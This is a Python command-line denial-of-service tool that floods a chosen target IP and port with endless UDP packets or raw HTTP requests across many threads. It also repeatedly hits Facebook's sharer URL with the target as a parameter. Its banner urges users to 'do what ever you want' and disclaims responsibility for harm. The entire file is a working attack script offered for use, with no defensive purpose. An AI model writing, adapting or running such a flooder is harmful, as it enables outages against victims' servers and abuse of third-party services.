import socket, time, random, sys, threading, optparse, urllib.request
from colorama import Fore, Style

def usage():
	print (f'''{Fore.YELLOW}{Style.BRIGHT} DDoS by: AL104
	Fuck Society Do What Ever You Want!.
	Note: I Dont Have The Responsibility If You Use This Tool To Harm Others!.
	Take The Risk YourSelf.\n
	usage : python3 ddos.py [-s] [-p] [-t]
	-h : help
	-t : target ip
	-p : port default 80
	-a : Ammo/bullet/power default 10
	-m : Mode [UDP/TCP] default udp''')
	sys.exit()


read = optparse.OptionParser(add_help_option=False,epilog="myDos")
read.add_option('-t', '--target',dest='target',help='Target IP')
read.add_option('-a', '--ammo',dest='ammo',help='Enter amount of Ammo/bullet')
read.add_option('-p', '--port', dest='port')
read.add_option('-h','--help',dest='help',action='store_true',help='help you')
read.add_option('-m','--mode',dest='mode',help='mode [UDP/TCP] default udp')
(value, key) = read.parse_args()

if value.help:
	usage()
if value.target is not None:
	target = value.target
else:
	usage()
if value.port is None:
	port = 80
else:
	port = value.port
if value.ammo is None:
	ammo = 10
else:
	ammo = value.ammo
if value.mode is None:
	mode = 'udp'
else:
	mode = value.mode.lower()

global uagent
uagent=[]
uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")

global data
headers = """
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
"""
data = headers

def test(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print('heh')
			time.sleep(.1)
	except:
		time.sleep(.1)


def dtest():
	while True:
		test('http://www.facebook.com/sharer/sharer.php?u='+"http://"+target)


def dos():
	try:
		x = 0
		bytes = random._urandom(1024)
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while True:
			x += 1
			s.sendto(bytes, (target, port))
			print(f'{Fore.YELLOW}[{x}]{Fore.CYAN} Bullet/s shooting to ==>> {Fore.GREEN}{target}')

	except socket.error:
		print(f'{Fore.RED}shot miss!!')

def dos2():
	x = 0
	try:
		while True:
			x+=1
			packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, port))
			if s.sendto(packet, (target, port)):
				s.shutdown(1)
				print(f'{Fore.YELLOW}[{ammo}]{Fore.CYAN} Bullet/s shot to >==>> {Fore.GREEN}[{target} ]')
			else:
				s.shutdown(1)
				print('site<!>down')
			threading.Thread(target=dtest).start()

	except socket.error:
		print(f'{Fore.RED} Shot Miss..')


print('CHECKING...')
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, port))

except socket.error as e:
	print("\033[91mWhat THE FUCK!, host/ip or port IS Invalid!\033[0m")
	usage()

for ST in range(0, 5):
	sys.stdout.write('\r                                                  ')
	sys.stdout.write(f'\r{Fore.MAGENTA}{Style.BRIGHT}starting to shoot in {ST}/5...{Style.DIM}')
	print
	time.sleep(.5)

if mode == 'udp':
	for p in range(0, int(ammo)):
		threading.Thread(target=dos).start()

elif mode == 'tcp':
	for p in range(0, int(ammo)):
		threading.Thread(target=dos2).start()

else:
	print("WTF.. Choose either UDP or TCP")
